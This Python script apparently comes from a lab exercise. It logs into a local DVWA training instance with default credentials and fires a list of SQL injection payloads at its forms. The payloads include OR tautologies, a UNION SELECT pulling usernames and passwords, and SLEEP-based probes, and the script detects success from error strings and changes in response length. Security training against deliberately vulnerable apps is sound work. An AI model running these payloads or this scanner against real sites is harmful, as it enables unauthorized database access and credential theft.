import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore, init

init(autoreset=True)

# Function to log into DVWA
def login_dvwa(session, url, username, password):
    login_url = urljoin(url, 'login.php')
    response = session.get(login_url, verify=False)
    soup = BeautifulSoup(response.content, 'html.parser')

    form = soup.find('form')
    if not form:
        print(f"{Fore.RED}[CONSOLE] Could not find the login form.")
        return False

    login_data = {input_tag['name']: input_tag.get('value', '') for input_tag in form.find_all('input') if input_tag.get('name')}
    login_data['username'] = username
    login_data['password'] = password

    response = session.post(login_url, data=login_data, verify=False)
    if 'index.php' in response.url:
        print(f"{Fore.GREEN}[CONSOLE] Login successful.")
        return True
    else:
        print(f"{Fore.RED}[CONSOLE] Login failed.")
        return False

# Function to retrieve all forms from a URL
def get_all_forms(session, url):
    response = session.get(url, verify=False)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup.find_all('form')

# Function to extract form details
def get_form_details(form):
    action = form.attrs.get('action', '').lower()
    method = form.attrs.get('method', 'get').lower()
    inputs = [{'name': input_tag['name'], 'type': input_tag.get('type', 'text'), 'value': input_tag.get('value', '')} for input_tag in form.find_all('input') if input_tag.get('name')]
    return {'action': action, 'method': method, 'inputs': inputs}

# Function to submit form and return the response
def submit_form(session, form_details, url, payload):
    target_url = urljoin(url, form_details['action'])
    data = {}
    for input in form_details['inputs']:
        if input['type'] == 'hidden' or input['value']:
            data[input['name']] = input['value'] + payload
        elif input['type'] != 'submit':
            data[input['name']] = f'test{payload}'
    
    if form_details['method'] == 'post':
        return session.post(target_url, data=data, verify=False)
    else:
        return session.get(target_url, params=data, verify=False)

# Function to detect SQL injection vulnerabilities
def scan_sql_injection(session, url):
    sql_payloads = [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "\" OR 1=1--", "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --", "' OR 'a'='a",
        "admin' --", "' OR 1=1#", "\" OR 1=1#",
        "' OR 1=1/*", "\" OR 1=1/*",
        "' UNION SELECT null, null--",
        "' UNION SELECT user, password FROM users --",
        "' AND SLEEP(5)--", "\" AND SLEEP(5)--"
    ]

    forms = get_all_forms(session, url)
    if not forms:
        print(f"{Fore.YELLOW}[CONSOLE] No forms detected on {url}")
        return

    print(f"{Fore.CYAN}[CONSOLE] Detected {len(forms)} forms on {url}")
    
    for form in forms:
        form_details = get_form_details(form)
        print(f"{Fore.BLUE}[DEBUG] Form details: {form_details}")
        for payload in sql_payloads:
            original_response = submit_form(session, form_details, url, "")
            response = submit_form(session, form_details, url, payload)
            if detect_sql_injection_response(original_response, response, payload):
                print(f"{Fore.GREEN}[CONSOLE] SQL Injection vulnerability detected with payload: {payload}")
            else:
                print(f"{Fore.WHITE}[CONSOLE] No vulnerability detected with payload: {payload}")

# Function to analyze the response for signs of SQL injection
def detect_sql_injection_response(original_response, injected_response, payload):
    errors = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "ORA-01756", "Microsoft OLE DB Provider for SQL Server",
        "Unclosed quotation mark", "Microsoft OLE DB Provider for Oracle",
        "missing right parenthesis", "Microsoft Access Driver"
    ]
    
    # Check for SQL error messages
    for error in errors:
        if error.lower() in injected_response.content.decode().lower():
            print(f"{Fore.RED}[DEBUG] SQL error detected: {error}")
            return True

    # Check for significant changes in response length
    if abs(len(original_response.content) - len(injected_response.content)) > 50:
        print(f"{Fore.RED}[DEBUG] Significant change in response length detected.")
        return True

    # Check for specific keywords indicating successful injection
    if "first name" in injected_response.content.decode().lower() and "surname" in injected_response.content.decode().lower():
        print(f"{Fore.RED}[DEBUG] SQL injection successful with payload: {payload}")
        return True

    return False

# Main function to start the scan
def start_scan():
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
    
    dvwa_url = 'http://192.168.64.2/dvwa/'
    dvwa_username = 'admin'
    dvwa_password = 'password'
    
    if not login_dvwa(s, dvwa_url, dvwa_username, dvwa_password):
        return
    
    vuln_page_url = urljoin(dvwa_url, 'vulnerabilities/sqli/')
    scan_sql_injection(s, vuln_page_url)

# Start the SQL injection scan process
start_scan()
